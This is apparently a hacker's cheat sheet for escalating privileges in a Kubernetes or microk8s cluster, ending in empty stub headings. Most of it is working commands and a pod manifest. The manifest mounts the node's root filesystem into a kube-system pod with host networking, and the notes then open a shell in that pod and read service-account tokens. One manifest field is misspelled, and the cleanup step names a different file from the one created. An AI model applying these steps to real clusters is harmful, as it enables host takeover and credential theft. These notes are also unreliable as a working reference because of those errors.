
For [[Kubernetes]] information follow the link

No `microk8s` no problem get official `kubectl` binary here: [Official Kubernetes download kubectl binaries](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/); official `curl` commandage..
```bash
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
```


Enumerate permissions
```bash
microk8s kubectl auth can-i --list
# If you see:
Resources   Non-Resource URLs   Resource Names   Verbs
*.*         []                  []               [*]
# You can do anything
```

Enumerate pods and namespaces, image name
```bash
microk8s kubectl get namespace
microk8s kubectl get pods
microk8s kubectl get pod $pod -o yaml # get the image: $field of current pod
```

####  Make a pod and mount away!

Create a YAML file to create a pod to run as root - named kubeRevShell.yaml - [prettifer](https://onlineyamltools.com/prettify-yaml) 
```YAML
apiVersion: v1
kind: Pod
metadata:
  name: some-pod
  namespace: kube-system
spec:
  containers:
    - name: shell
      image: # GET THE IMAGE NAME OF CURRENT POD
      command: ['/bin/sh']
      args: ['-c', 'sleep 300000']
      volumeMounts:
        - mountPath: /mnt
          name: hostfs
  volumes:
    - name: hostfs
      hostPath:
        path: /
  autommountServiceAccountToken: true
  hostNetwork: true
```
Beware:
`name:` must be a lowercase RFC 1123 label.

Apply this configuration
```bash
microk8s kubectl apply -f kubeRevShell.yaml
```

Check the status of the pod
```bash
microk8s kubectl get pods -n kube-system # display kube-system namespace
```

Exec a very minimal shell, works as nested `nc` no tty... 
```bash
./kubectl exec some-pod -n kube-system --stdin --tty -- /bin/bash
```

Clean up yourself 
```bash
./kubectl delete -f kubeShell.yaml
```

#### Kubernetes Token Abuse

`cat /var/run/secrets/kubernetes.io/$account/token`

Pod breakout

Privilege Escape

Cloud Hacking

## References

[Online YAML prettifier](https://onlineyamltools.com/prettify-yaml)
[Official Kubernetes download kubectl binaries](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/);